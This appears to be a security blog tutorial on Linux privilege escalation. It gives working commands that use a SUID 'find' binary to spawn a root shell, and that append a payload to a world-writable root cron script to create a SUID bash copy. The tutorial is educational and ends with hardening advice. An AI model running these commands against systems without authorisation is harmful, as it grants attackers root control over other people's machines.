---
title: "Understanding Privilege Escalation in Linux Environments"
date: "2024-05-15"
author: "Patch"
tags: ["Linux", "Privilege Escalation", "Security", "Tutorial"]
description: "A comprehensive guide on identifying and exploiting common privilege escalation vectors in Linux systems, specifically focusing on SUID binaries and misconfigured cron jobs."
readTime: "8 min read"
---

# Introduction

Privilege escalation is a critical phase in the attack lifecycle. Once an attacker gains initial access to a system, the immediate next goal is to elevate privileges to gain administrative control. In Linux environments, this usually means obtaining `root` access.

In this tutorial, we will explore two of the most common methods for local privilege escalation:
1. SUID Binaries
2. Misconfigured Cron Jobs

> **Disclaimer:** This tutorial is for educational purposes only. Only perform these techniques on systems you own or have explicit permission to test.

## 1. SUID Binaries

SUID (Set owner User ID up on execution) is a special type of file permission given to a file. When a file with SUID permission is executed, it runs with the privileges of the file's owner, rather than the user executing it.

If a binary owned by `root` has the SUID bit set, and the binary has vulnerabilities or allows for arbitrary command execution (like `find`, `nmap`, `vim`), it can be exploited.

### Finding SUID Binaries

You can find all files on a system with the SUID bit set using the following `find` command:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Let's say we find `/usr/bin/find` has the SUID bit set. 

### Exploitation

The `find` command has an `-exec` argument which allows us to execute other commands. Because `find` has SUID root, the command executed via `-exec` will also run as root.

```bash
find . -exec /bin/sh -p \; -quit
```

Executing this immediately drops us into a root shell!

## 2. Misconfigured Cron Jobs

Cron jobs are used to schedule tasks to run periodically. Sometimes, administrators configure cron jobs to run scripts as `root`. If these scripts are writable by a lower-privileged user, or if they call programs without specifying the absolute path (relying on the `$PATH` variable), they become a vector for privilege escalation.

### Identifying Cron Jobs

You can inspect the global crontab file:

```bash
cat /etc/crontab
```

Look for lines where the user column is `root` and inspect the scripts being executed.

```text
# Example /etc/crontab entry
* * * * * root /usr/local/bin/backup.sh
```

### Exploitation

If `/usr/local/bin/backup.sh` is world-writable, we can simply append our malicious payload to it:

```bash
echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash" >> /usr/local/bin/backup.sh
```

Wait a minute for the cron job to run, and then execute the newly created SUID bash binary:

```bash
/tmp/bash -p
```

And just like that, we have root.

## Conclusion

Understanding how privilege escalation works is fundamental to both offensive security and defensive hardening. By ensuring proper file permissions and strictly auditing SUID binaries and cron jobs, defenders can significantly reduce the attack surface.

Always follow the principle of least privilege and regularly audit your systems!
